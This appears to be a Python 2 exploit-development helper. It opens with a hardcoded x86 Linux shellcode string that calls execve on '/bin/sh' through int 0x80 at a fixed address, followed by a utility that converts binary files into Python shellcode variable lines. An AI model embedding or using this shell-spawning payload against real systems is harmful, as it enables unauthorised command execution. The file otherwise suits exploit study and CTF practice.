#!/usr/bin/python

shellcode = ""
shellcode += "\x90\x31\xc0\xb0\x0b\xbb\xfc\x91\x04\x08\x31\xc9"
shellcode += "\x89\xca\xcd\x80\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode += "\x00\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00"
shellcode += "\x97"



def print_shellcode(sc, varname = "shellcode"):
	code = ""
	code += "%s = \"\"\n" % (varname)
	for i in range(0, len(sc), 16):
		line = sc[i:i+16]
		s = ""
		for x in line:
			s += "\\x%02x" % (ord(x))
		code += "%s += \"%s\"\n" % (varname, s)
	return code

if __name__ == "__main__":
	import sys
	if(len(sys.argv) < 3):
		print "%s: [variable name] [binary file] [output file]" % (sys.argv[0])
		print "\tWill output to stdout if ouput file is not specified"
	else:
		f = open(sys.argv[2], "rb")
		code = print_shellcode(f.read(), sys.argv[1])
		f.close()
		if(len(sys.argv) == 3):
			print code
		else:
			f = open(sys.argv[3], "w")
			f.write(code)
			f.close
